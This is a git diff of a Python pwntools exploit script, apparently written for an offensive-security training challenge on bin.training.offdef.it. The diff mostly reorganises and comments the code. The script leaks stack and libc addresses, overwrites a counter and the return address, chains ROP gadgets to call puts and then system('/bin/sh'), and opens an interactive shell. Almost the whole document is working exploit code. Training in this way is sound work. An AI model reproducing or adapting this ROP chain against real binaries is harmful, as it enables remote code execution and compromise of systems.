@@ -1,5 +1,6 @@
 from pwn import *
-from sys import *
+from time import sleep
+import sys
 
 SERVER = "bin.training.offdef.it"
 PORT = "4003"
@@ -26,33 +27,28 @@ if "--debug" in sys.argv:
 
 
 #code
-
-def pushchain(chain):
-    for i in chain: 
-        load_on_stack(i)
-
-
-#pushchain(chain)
-
 timesleep=0.1
-flips= 0x00602068 #addr where flips are saved
+flips= 0x602068 #addr where flips are saved
 
+#sending bin/sh in name
 str = b"/bin/sh"+b"A"*(32-7)
 r.send(str)
 sleep(timesleep)
+
+#leaking stack addr and calculated other addresses (more or less useless)
 r.recvuntil(str)
 leaked_stack = u64(r.recvuntil(b"\x7f")+b"\x00\x00")
 main_stack = leaked_stack+ 0x48
 game_stack = leaked_stack+ 0x38
 possible_libc = main_stack + 0xb8
 offset_libc  = 0x1e40
+
 print(hex(leaked_stack))
-#print(" [!] name main stack found: %#x" % main_stack)
 print(" [!] game stack addr: %#x" % game_stack)
 print(" [!] libc stack addr: %#x" % possible_libc)
 sleep(timesleep)
 
-#r.interactive()
+#overwriting the flips and the return addr
 r.sendline(hex(flips))
 sleep(timesleep)
 r.sendline(b"FF")
@@ -66,12 +62,13 @@ sleep(timesleep)
 r.sendline(b'7')
 remaining_writes = 0xFF
 
-#newstack = game_stack - 0x28
+#now stack setted accordly 
 newstack = game_stack
 rip = game_stack
 print(" [!] newstack addr: %#x" % newstack)
 
 
+#function needed now to load on stack stuff (just use push_chain)
 def load_on_stack(addr):
     global remaining_writes
     global newstack
@@ -103,29 +100,31 @@ def load_there(where, what):
         r.sendline(hex(where+i))
         i-=1
         sleep(timesleep)
+        r.recv()
         r.sendline(x)
 
     print("[!] loaded %#x in " %what, "%#x" %where)
 
+def pushchain(chain):
+    for i in chain: 
+        load_on_stack(i)
 
+#useful gadgets
 pop_rdi= 0x400b33
 pop_rsi_r15= 0x400b31
 
-
 #setting \n binsh
-binsh = 0x6020a0
+binsh = 0x6020a0 #global name addr
 r.sendline(hex(binsh+7))
 sleep(timesleep)
-r.sendline('0')
+r.sendline(b'0')
 sleep(timesleep)
 
-#setting read
-# read_got = 0x602030
+#useful addr
 play = 0x4009cd
-# load_there(read_got, play)
-
-
 puts = 0x400666
+
+#leaking libc
 chain = [
     pop_rdi, 
     0x602028,
@@ -135,20 +134,21 @@ chain = [
 
 pushchain(chain)
 sleep(timesleep)
-r.sendline("0")
-#print(r.recv())
+r.sendline(b"0")
 r.recvuntil(b"/bin/sh :)\n")
 libc_addr = u64(r.recvuntil(b"\x7f")+b"\x00\x00") - 0x38770
 print(" [!] libc addr: %#x" % libc_addr)
 
+#reset the stack addr
 newstack = game_stack+0x20
 
+#setting the libc
 libc= ELF("./libc-2.35.so")
 libc.address = libc_addr -0x28000
 system = libc.symbols['system'] #get system() function addr
-
 print("[!] sys addr: %#x" % system)
 
+#make the real exploit
 chain=[
     pop_rsi_r15,
     0x0,
@@ -161,7 +161,7 @@ chain=[
 pushchain(chain)
 sleep(timesleep)
 input("wait")
-r.sendline("0")
+r.sendline(b"0")
 input("wait")
 
 r.interactive()
